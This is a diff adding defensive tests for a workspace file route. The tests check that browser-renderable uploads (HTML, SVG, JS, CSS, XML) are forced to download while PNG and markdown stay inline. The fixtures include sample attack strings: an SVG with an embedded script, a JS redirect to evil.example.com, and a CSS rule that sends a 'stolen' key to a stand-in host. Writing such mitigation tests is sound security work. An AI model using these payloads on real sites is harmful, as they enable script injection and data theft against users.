@@ -210,6 +210,66 @@ describe('workspace routes', () => {
       });
       expect(res.status).toBe(422);
     });
+
+    describe('VULN-003 — force download on browser-renderable extensions', () => {
+      const cases: Array<[string, string]> = [
+        ['evil.html', '<html><body>phishing form</body></html>'],
+        ['evil.htm', '<html></html>'],
+        ['evil.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'],
+        ['evil.js', 'window.location="https://evil.example.com"'],
+        ['evil.mjs', 'export const x = 1'],
+        ['evil.cjs', 'module.exports = {}'],
+        ['evil.css', ':focus { background: url(//evil/?key=stolen) }'],
+        ['evil.xml', '<?xml version="1.0"?><root/>'],
+        ['evil.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml"></html>'],
+      ];
+
+      for (const [filename, payload] of cases) {
+        it(`forces attachment + octet-stream for ${filename}`, async () => {
+          ctx = await makeCtx();
+          await fsp.writeFile(path.join(ctx.workspaceDir, filename), payload);
+
+          const res = await ctx.app.request(
+            `/api/workspace/file?path=${filename}`,
+            { headers: authHeaders(ctx.sessionJwt) },
+          );
+          expect(res.status).toBe(200);
+          expect(res.headers.get('content-type')).toBe('application/octet-stream');
+          const cd = res.headers.get('content-disposition') ?? '';
+          expect(cd).toMatch(/^attachment;/);
+          expect(cd).toContain(filename);
+        });
+      }
+
+      it('still serves images with their native MIME (PNG inline)', async () => {
+        ctx = await makeCtx();
+        // Minimal PNG signature is enough for the route — it does not sniff
+        // magic bytes here, only relies on extension.
+        const png = Buffer.from([
+          0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
+        ]);
+        await fsp.writeFile(path.join(ctx.workspaceDir, 'ok.png'), png);
+
+        const res = await ctx.app.request('/api/workspace/file?path=ok.png', {
+          headers: authHeaders(ctx.sessionJwt),
+        });
+        expect(res.status).toBe(200);
+        expect(res.headers.get('content-type')).toBe('image/png');
+        expect(res.headers.get('content-disposition')).toBeNull();
+      });
+
+      it('serves text/markdown inline (no forced download)', async () => {
+        ctx = await makeCtx();
+        await fsp.writeFile(path.join(ctx.workspaceDir, 'note.md'), '# hi');
+
+        const res = await ctx.app.request('/api/workspace/file?path=note.md', {
+          headers: authHeaders(ctx.sessionJwt),
+        });
+        expect(res.status).toBe(200);
+        expect(res.headers.get('content-type')).toBe('text/markdown');
+        expect(res.headers.get('content-disposition')).toBeNull();
+      });
+    });
   });
 
   describe('POST /api/workspace/directory', () => {
